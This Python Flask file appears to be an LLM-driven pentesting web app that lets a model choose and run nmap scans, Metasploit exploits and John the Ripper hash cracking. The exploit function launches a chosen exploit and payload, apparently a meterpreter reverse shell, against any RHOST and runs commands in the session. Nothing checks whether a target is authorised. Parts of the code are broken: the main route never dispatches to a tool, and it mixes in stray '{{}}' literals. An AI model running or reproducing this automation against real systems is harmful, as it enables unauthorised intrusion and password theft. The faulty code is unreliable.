from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
import subprocess
import json
from transformers import pipeline
from pymetasploit3.msfrpc import MsfRpcClient
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = 'a_very_secret_key'  # Replace with a real secret key
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'


class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password_hash = db.Column(db.String(100))

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))


class Correction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    prompt = db.Column(db.String(1000))
    corrected_output = db.Column(db.String(1000))

@app.route('/correction', methods=['GET', 'POST'])
@login_required
def correction():
    if request.method == 'POST':
        prompt = request.form['prompt']
        corrected_output = request.form['corrected_output']
        new_correction = Correction(prompt=prompt, corrected_output=corrected_output)
        db.session.add(new_correction)
        db.session.commit()
        flash('Correction submitted. Thank you for your feedback!', 'success')
        return redirect(url_for('index'))
    else:
        prompt = request.args.get('prompt')
        output = request.args.get('output')
        return render_template('correction.html', prompt=prompt, output=output)

@app.route('/finetune')
@login_required
def finetune():
    corrections = Correction.query.all()
    if not corrections:
        flash('No corrections to fine-tune.', 'info')
        return redirect(url_for('index'))

    # Create a fine-tuning dataset
    dataset = []
    for c in corrections:
        dataset.append({"text": f"<s>[INST] {c.prompt} [/INST] {c.corrected_output} </s>"})
    
    # (This is a simplified approach. In a real-world application, you would use a more robust
    #  fine-tuning library and process, and you would likely need a larger dataset.)
    
    # Simulate fine-tuning by just printing the dataset
    print(dataset)
    
    flash(f'Fine-tuning process initiated with {len(corrections)} corrections.', 'success')
    return redirect(url_for('index'))
llm_pipeline = pipeline("text-generation", model="TheBloke/WhiteRabbitNeo-13B-v1-GPTQ", revision="gptq-4bit-32g-actorder_True")

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()
        if user and user.check_password(password):
            login_user(user)
            flash('Logged in successfully.', 'success')
            return redirect(url_for('index'))
        else:
            flash('Invalid username or password.', 'danger')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        new_user = User(username=username)
        new_user.set_password(password)
        db.session.add(new_user)
        db.session.commit()
        flash('Account created successfully. Please log in.', 'success')
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('index'))

@app.route('/')
@login_required
def index():
    return render_template('index.html')


@app.route('/prompt', methods=['POST'])
@login_required
def prompt():
    user_prompt = request.form['prompt']
    
    # Use the LLM to determine the tool and parameters
    prompt = f"""
    You are a master controller for a pentesting application. Analyze the user's request and determine which tool to use (nmap, metasploit, or john). 
    Provide the output in JSON format.

    **User Request:**
    {user_prompt}

    **JSON Output:**
    ```json
    {{
        "tool": "The tool to use (nmap, metasploit, or john).",
        "parameters": {{
            "target": "The target IP address for nmap.",
            "scan_type": "The nmap scan type.",
            "exploit": "The Metasploit exploit.",
            "payload": "The Metasploit payload.",
            "rhost": "The RHOST for Metasploit.",
            "lhost": "The LHOST for Metasploit.",
            "lport": "The LPORT for Metasploit.",
            "hash": "The hash to crack with John the Ripper."
        }}
    }}
    ```
    """
    llm_output = llm_pipeline(prompt, max_length=1024, num_return_sequences=1, temperature=0.2)[0]['generated_text']
    
    try:
        json_output = llm_output.split('```json')[1].split('```')[0]
        llm_data = json.loads(json_output)
        tool = llm_data.get('tool')
        parameters = llm_data.get('parameters', {{}})
    except (IndexError, json.JSONDecodeError):
        return render_template('error.html', error="Error parsing LLM output.")


def nmap_scan(target, scan_type):
    command = ['nmap', scan_type, target]
    result = subprocess.run(command, capture_output=True, text=True)
    
    prompt = f"""
    Analyze the following nmap scan results and provide a structured summary of the findings in JSON format.

    **Nmap Scan Results:**
    {result.stdout}

    **JSON Output:**
    ```json
    {{
        "summary": "A brief summary of the findings.",
        "metasploit_suggestion": {{
            "exploit": "The recommended Metasploit exploit (e.g., 'exploit/windows/smb/ms17_010_eternalblue').",
            "payload": "The recommended payload (e.g., 'windows/x64/meterpreter/reverse_tcp')."
        }}
    }}
    ```
    """
    llm_output = llm_pipeline(prompt, max_length=1024, num_return_sequences=1, temperature=0.2)[0]['generated_text']
    
    try:
        json_output = llm_output.split('```json')[1].split('```')[0]
        llm_data = json.loads(json_output)
        summary = llm_data.get('summary', '')
        metasploit_suggestion = llm_data.get('metasploit_suggestion', {{}})
    except (IndexError, json.JSONDecodeError):
        summary = "Error parsing LLM output."
        metasploit_suggestion = {{}}
    
    return render_template('nmap_results.html', results=result.stdout, summary=summary, metasploit_suggestion=metasploit_suggestion, target=target)

def metasploit_exploit(exploit_name, payload_name, rhost, lhost, lport):
    try:
        client = MsfRpcClient('your_password', ssl=True)
        exploit = client.modules.use('exploit', exploit_name)
        payload = client.modules.use('payload', payload_name)

        exploit['RHOSTS'] = rhost
        exploit['LHOST'] = lhost
        exploit['LPORT'] = lport

        job_id = exploit.execute(payload=payload)
        
        import time
        time.sleep(10)
        
        sessions = client.sessions.list
        session_id = list(sessions.keys())[0]
        shell = client.sessions.session(session_id)
        shell.write('whoami\n')
        output = shell.read()
        
        return render_template('metasploit_results.html', output=output)
    except Exception as e:
        return render_template('metasploit_results.html', error=str(e))

def john_the_ripper(hash_string):
    try:
        with open('/tmp/hashes.txt', 'w') as f:
            f.write(hash_string)
        
        # Use the LLM to get the John the Ripper command
        prompt = f"""
        Analyze the following hash and recommend a John the Ripper command to crack it. 
        Provide the output in JSON format.

        **Hash:**
        {hash_string}

        **JSON Output:**
        ```json
        {{
            "format": "The John the Ripper format (e.g., 'nt', 'raw-md5').",
            "wordlist": "The recommended wordlist (e.g., '/usr/share/wordlists/rockyou.txt')."
        }}
        ```
        """
        llm_output = llm_pipeline(prompt, max_length=512, num_return_sequences=1, temperature=0.2)[0]['generated_text']
        
        try:
            json_output = llm_output.split('```json')[1].split('```')[0]
            llm_data = json.loads(json_output)
            john_format = llm_data.get('format')
            wordlist = llm_data.get('wordlist')
        except (IndexError, json.JSONDecodeError):
            return render_template('john_results.html', error="Error parsing LLM output.")

        command = ['john', f'--format={john_format}', f'--wordlist={wordlist}', '/tmp/hashes.txt']
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        
        show_command = ['john', '--show', '/tmp/hashes.txt']
        cracked_result = subprocess.run(show_command, capture_output=True, text=True, check=True)
        
        prompt = f"""
        Analyze the following cracked passwords and provide a summary of their strength.

        **Cracked Passwords:**
        {cracked_result.stdout}

        **Analysis:**
        """
        final_analysis = llm_pipeline(prompt, max_length=512, num_return_sequences=1, temperature=0.2)[0]['generated_text']
        
        return render_template('john_results.html', cracked_passwords=cracked_result.stdout, analysis=final_analysis)
    except subprocess.CalledProcessError as e:
        return render_template('john_results.html', error=e.stderr)
    except Exception as e:
        return render_template('john_results.html', error=str(e))
